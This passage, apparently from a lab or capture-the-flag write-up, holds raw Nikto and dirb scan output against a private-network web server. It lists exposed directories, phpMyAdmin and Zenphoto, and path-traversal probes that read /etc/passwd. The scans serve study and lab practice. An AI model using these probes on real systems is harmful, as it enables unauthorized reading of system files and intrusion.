+ Entry &#x27;&#x2F;thumb.php&#x27; in robots.txt returned a non-forbidden or redirect HTTP code (302)
+ Entry &#x27;&#x2F;ABOUT.md&#x27; in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry &#x27;&#x2F;CHANGELOG.md&#x27; in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry &#x27;&#x2F;CREDITS.md&#x27; in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry &#x27;&#x2F;INSTALLATION.md&#x27; in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry &#x27;&#x2F;README.md&#x27; in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry &#x27;&#x2F;RELEASE.md&#x27; in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry &#x27;&#x2F;TODO.md&#x27; in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ OSVDB-3268: &#x2F;files&#x2F;: Directory indexing found.
+ Entry &#x27;&#x2F;files&#x2F;&#x27; in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ OSVDB-3268: &#x2F;tmp&#x2F;: Directory indexing found.
+ Entry &#x27;&#x2F;tmp&#x2F;&#x27; in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ &quot;robots.txt&quot; contains 30 entries which should be manually viewed.
+ Multiple index files found: &#x2F;index.php, &#x2F;index.html
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS
+ OSVDB-2870: &#x2F;index.php?download=&#x2F;etc&#x2F;passwd: Snif 1.2.4 allows any file to be retrieved from the web server.
+ OSVDB-59085: &#x2F;index.php?|=..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd: Portix-PHP Portal allows retrieval of arbitrary files via the &#x27;..&#x27; type filtering problem.
+ &#x2F;index.php?page=..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd: The PHP-Nuke Rocket add-in is vulnerable to file traversal, allowing an attacker to view any file on the host. (probably Rocket, but could be any index.php)
+ OSVDB-59085: &#x2F;index.php?l=forum&#x2F;view.php&amp;topic=..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd: Portix-PHP Portal allows retrieval of arbitrary files via the &#x27;..&#x27; type filtering problem.
+ OSVDB-8193: &#x2F;index.php?module=ew_filemanager&amp;type=admin&amp;func=manager&amp;pathext=..&#x2F;..&#x2F;..&#x2F;etc&#x2F;&amp;view=passwd: EW FileManager for PostNuke allows arbitrary file retrieval.
+ OSVDB-3092: &#x2F;admin&#x2F;: This might be interesting...
+ OSVDB-3092: &#x2F;files&#x2F;: This might be interesting...
+ Uncommon header &#x27;x-ob_mode&#x27; found, with contents: 1
+ OSVDB-3092: &#x2F;tmp&#x2F;: This might be interesting...
+ OSVDB-3093: &#x2F;admin&#x2F;index.php: This might be interesting... has been seen in web logs from an unknown scanner.
+ OSVDB-3092: &#x2F;xmlrpc.php: xmlrpc.php was found.
+ OSVDB-3233: &#x2F;icons&#x2F;README: Apache default file found.
+ OSVDB-3092: &#x2F;test.php: This might be interesting...
+ &#x2F;phpmyadmin&#x2F;: phpMyAdmin directory found
+ 26349 requests: 0 error(s) and 47 item(s) reported on remote host
+ End Time:           2017-08-07 20:44:44 (GMT-6) (119 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;dirb http:&#x2F;&#x2F;10.37.129.9 &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb&#x2F;big.txt

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Mon Aug  7 20:59:38 2017
URL_BASE: http:&#x2F;&#x2F;10.37.129.9&#x2F;
WORDLIST_FILES: &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb&#x2F;big.txt

-----------------

GENERATED WORDS: 20458

---- Scanning URL: http:&#x2F;&#x2F;10.37.129.9&#x2F; ----
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;FCKeditor&#x2F;
+ http:&#x2F;&#x2F;10.37.129.9&#x2F;LICENSE (CODE:200|SIZE:15437)
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;admin&#x2F;
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;backups&#x2F;
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;cron&#x2F;
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;external&#x2F;
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;files&#x2F;
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;framework&#x2F;
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;install&#x2F;
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;javascript&#x2F;
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;
+ http:&#x2F;&#x2F;10.37.129.9&#x2F;robots.txt (CODE:200|SIZE:1347)
+ http:&#x2F;&#x2F;10.37.129.9&#x2F;server-status (CODE:403|SIZE:299)
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;themes&#x2F;
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;tmp&#x2F;
+ http:&#x2F;&#x2F;10.37.129.9&#x2F;webalizer (CODE:200|SIZE:0)
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;zenphoto&#x2F;

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;FCKeditor&#x2F; ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode &#x27;-w&#x27; if you want to scan it anyway)

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;admin&#x2F; ----
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;admin&#x2F;gallery&#x2F;

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;backups&#x2F; ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode &#x27;-w&#x27; if you want to scan it anyway)

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;cron&#x2F; ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode &#x27;-w&#x27; if you want to scan it anyway)

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;external&#x2F; ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode &#x27;-w&#x27; if you want to scan it anyway)

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;files&#x2F; ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode &#x27;-w&#x27; if you want to scan it anyway)

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;framework&#x2F; ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode &#x27;-w&#x27; if you want to scan it anyway)

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;install&#x2F; ----
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;install&#x2F;changes&#x2F;
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;install&#x2F;files&#x2F;
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;install&#x2F;images&#x2F;
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;install&#x2F;include&#x2F;
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;install&#x2F;pages&#x2F;
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;install&#x2F;popups&#x2F;
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;install&#x2F;samples&#x2F;
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;install&#x2F;upgrades&#x2F;

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;javascript&#x2F; ----
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;javascript&#x2F;jquery&#x2F;

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F; ----
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;doc&#x2F;
+ http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;favicon.ico (CODE:200|SIZE:22486)
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;js&#x2F;
+ http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;libraries (CODE:403|SIZE:306)
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;locale&#x2F;
+ http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;setup (CODE:401|SIZE:458)
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;sql&#x2F;
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;templates&#x2F;
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;themes&#x2F;

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;themes&#x2F; ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode &#x27;-w&#x27; if you want to scan it anyway)

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;tmp&#x2F; ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode &#x27;-w&#x27; if you want to scan it anyway)

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;zenphoto&#x2F; ----
+ http:&#x2F;&#x2F;10.37.129.9&#x2F;zenphoto&#x2F;LICENSE (CODE:200|SIZE:18205)
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;zenphoto&#x2F;albums&#x2F;
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;zenphoto&#x2F;cache&#x2F;
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;zenphoto&#x2F;cache_html&#x2F;
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;zenphoto&#x2F;plugins&#x2F;
+ http:&#x2F;&#x2F;10.37.129.9&#x2F;zenphoto&#x2F;robots.txt (CODE:200|SIZE:471)
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;zenphoto&#x2F;themes&#x2F;
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;zenphoto&#x2F;uploaded&#x2F;
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;zenphoto&#x2F;zp-core&#x2F;
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;zenphoto&#x2F;zp-data&#x2F;

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;admin&#x2F;gallery&#x2F; ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode &#x27;-w&#x27; if you want to scan it anyway)

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;install&#x2F;changes&#x2F; ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode &#x27;-w&#x27; if you want to scan it anyway)

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;install&#x2F;files&#x2F; ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode &#x27;-w&#x27; if you want to scan it anyway)

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;install&#x2F;images&#x2F; ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode &#x27;-w&#x27; if you want to scan it anyway)

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;install&#x2F;include&#x2F; ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode &#x27;-w&#x27; if you want to scan it anyway)

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;install&#x2F;pages&#x2F; ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode &#x27;-w&#x27; if you want to scan it anyway)

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;install&#x2F;popups&#x2F; ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode &#x27;-w&#x27; if you want to scan it anyway)

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;install&#x2F;samples&#x2F; ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode &#x27;-w&#x27; if you want to scan it anyway)

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;install&#x2F;upgrades&#x2F; ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode &#x27;-w&#x27; if you want to scan it anyway)

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;javascript&#x2F;jquery&#x2F; ----
+ http:&#x2F;&#x2F;10.37.129.9&#x2F;javascript&#x2F;jquery&#x2F;jquery (CODE:200|SIZE:284394)

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;doc&#x2F; ----
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;doc&#x2F;html&#x2F;

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;js&#x2F; ----
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;js&#x2F;jquery&#x2F;
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;js&#x2F;pmd&#x2F;
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;js&#x2F;transformations&#x2F;

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;locale&#x2F; ----
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;locale&#x2F;az&#x2F;
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;locale&#x2F;bg&#x2F;
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;locale&#x2F;bn&#x2F;
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;locale&#x2F;ca&#x2F;
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;locale&#x2F;cs&#x2F;
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;locale&#x2F;da&#x2F;
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;locale&#x2F;de&#x2F;
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;locale&#x2F;el&#x2F;
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;locale&#x2F;es&#x2F;
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;locale&#x2F;et&#x2F;
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;locale&#x2F;fi&#x2F;
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;locale&#x2F;fr&#x2F;
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;locale&#x2F;gl&#x2F;
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;locale&#x2F;hu&#x2F;
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;locale&#x2F;hy&#x2F;
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;locale&#x2F;ia&#x2F;
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;locale&#x2F;id&#x2F;
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;locale&#x2F;it&#x2F;
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;locale&#x2F;ja&#x2F;
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;locale&#x2F;ko&#x2F;
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;locale&#x2F;lt&#x2F;
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;locale&#x2F;nb&#x2F;
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;locale&#x2F;nl&#x2F;
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;locale&#x2F;pl&#x2F;
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;locale&#x2F;pt&#x2F;
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;locale&#x2F;pt_BR&#x2F;
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;locale&#x2F;ro&#x2F;
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;locale&#x2F;ru&#x2F;
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;locale&#x2F;si&#x2F;
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;locale&#x2F;sk&#x2F;
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;locale&#x2F;sl&#x2F;
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;locale&#x2F;sq&#x2F;
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;locale&#x2F;sv&#x2F;
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;locale&#x2F;tr&#x2F;
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;locale&#x2F;uk&#x2F;
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;locale&#x2F;vi&#x2F;
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;locale&#x2F;zh_CN&#x2F;
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;locale&#x2F;zh_TW&#x2F;

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;sql&#x2F; ----

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;templates&#x2F; ----
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;templates&#x2F;components&#x2F;
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;templates&#x2F;database&#x2F;
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;templates&#x2F;error&#x2F;
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;templates&#x2F;javascript&#x2F;
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;templates&#x2F;list&#x2F;
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;templates&#x2F;navigation&#x2F;
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;templates&#x2F;table&#x2F;
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;templates&#x2F;test&#x2F;

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;themes&#x2F; ----
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;themes&#x2F;original&#x2F;

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;zenphoto&#x2F;albums&#x2F; ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode &#x27;-w&#x27; if you want to scan it anyway)

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;zenphoto&#x2F;cache&#x2F; ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode &#x27;-w&#x27; if you want to scan it anyway)

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;zenphoto&#x2F;cache_html&#x2F; ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode &#x27;-w&#x27; if you want to scan it anyway)

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;zenphoto&#x2F;plugins&#x2F; ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode &#x27;-w&#x27; if you want to scan it anyway)

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;zenphoto&#x2F;themes&#x2F; ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode &#x27;-w&#x27; if you want to scan it anyway)

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;zenphoto&#x2F;uploaded&#x2F; ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode &#x27;-w&#x27; if you want to scan it anyway)

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;zenphoto&#x2F;zp-core&#x2F; ----
+ http:&#x2F;&#x2F;10.37.129.9&#x2F;zenphoto&#x2F;zp-core&#x2F;dataaccess (CODE:200|SIZE:187)
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;zenphoto&#x2F;zp-core&#x2F;exif&#x2F;
+ http:&#x2F;&#x2F;10.37.129.9&#x2F;zenphoto&#x2F;zp-core&#x2F;htaccess (CODE:200|SIZE:546)
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;zenphoto&#x2F;zp-core&#x2F;images&#x2F;
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;zenphoto&#x2F;zp-core&#x2F;js&#x2F;
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;zenphoto&#x2F;zp-core&#x2F;locale&#x2F;
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;zenphoto&#x2F;zp-core&#x2F;setup&#x2F;
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;zenphoto&#x2F;zp-core&#x2F;utilities&#x2F;
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;zenphoto&#x2F;zp-core&#x2F;watermarks&#x2F;

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;zenphoto&#x2F;zp-data&#x2F; ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode &#x27;-w&#x27; if you want to scan it anyway)

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;doc&#x2F;html&#x2F; ----
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;doc&#x2F;html&#x2F;_static&#x2F;

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;js&#x2F;jquery&#x2F; ----

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;js&#x2F;pmd&#x2F; ----

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;js&#x2F;transformations&#x2F; ----

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;locale&#x2F;az&#x2F; ----

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;locale&#x2F;bg&#x2F; ----

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;locale&#x2F;bn&#x2F; ----

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;locale&#x2F;ca&#x2F; ----

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;locale&#x2F;cs&#x2F; ----

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;locale&#x2F;da&#x2F; ----

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;locale&#x2F;de&#x2F; ----

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;locale&#x2F;el&#x2F; ----

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;locale&#x2F;es&#x2F; ----

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;locale&#x2F;et&#x2F; ----

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;locale&#x2F;fi&#x2F; ----

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;locale&#x2F;fr&#x2F; ----

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;locale&#x2F;gl&#x2F; ----

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;locale&#x2F;hu&#x2F; ----

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;locale&#x2F;hy&#x2F; ----

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;locale&#x2F;ia&#x2F; ----

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;locale&#x2F;id&#x2F; ----

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;locale&#x2F;it&#x2F; ----

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;locale&#x2F;ja&#x2F; ----

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;locale&#x2F;ko&#x2F; ----

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;locale&#x2F;lt&#x2F; ----

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;locale&#x2F;nb&#x2F; ----

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;locale&#x2F;nl&#x2F; ----

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;locale&#x2F;pl&#x2F; ----

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;locale&#x2F;pt&#x2F; ----

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;locale&#x2F;pt_BR&#x2F; ----

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;locale&#x2F;ro&#x2F; ----

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;locale&#x2F;ru&#x2F; ----

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;locale&#x2F;si&#x2F; ----

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;locale&#x2F;sk&#x2F; ----

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;locale&#x2F;sl&#x2F; ----

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;locale&#x2F;sq&#x2F; ----

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;locale&#x2F;sv&#x2F; ----

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;locale&#x2F;tr&#x2F; ----

